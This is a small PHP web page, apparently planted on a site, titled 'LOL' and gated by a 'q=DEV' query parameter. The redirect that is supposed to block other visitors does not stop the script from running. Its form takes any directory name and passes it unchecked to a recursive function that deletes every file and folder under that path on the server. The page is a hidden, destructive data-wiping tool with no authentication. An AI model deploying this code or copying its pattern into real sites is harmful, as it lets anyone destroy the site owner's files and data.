<?php 
	// print_r($_GET[]);
	if ($_GET['q'] != "DEV" || empty($_GET)) {
		header('Location: https://app.gssreo.com/404');
	}else{
		
	}


 ?>
<!DOCTYPE html>
<html>
<head>
	<title>LOL</title>
	<style type="text/css">
		body {
    background-image: url("giff.gif" );
    background-repeat: repeat;
}
	</style>
</head>
<body>
	<form method="post">
		<input type="text" name="dir_name">
		<input type="submit" name="submit">
	</form>
</body>
</html>





<?php

// if (isset($_POST) {
	$dirname = $_POST['dir_name'];
	delete_directory($dirname);
// }
function delete_directory($dirname) {
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
	 if (!$dir_handle)
	      return false;
	 while($file = readdir($dir_handle)) {
	       if ($file != "." && $file != "..") {
	            if (!is_dir($dirname."/".$file))
	                 unlink($dirname."/".$file);
	            else
	                 delete_directory($dirname.'/'.$file);
	       }
	 }
	 closedir($dir_handle);
	 rmdir($dirname);
	 return true;
}
?>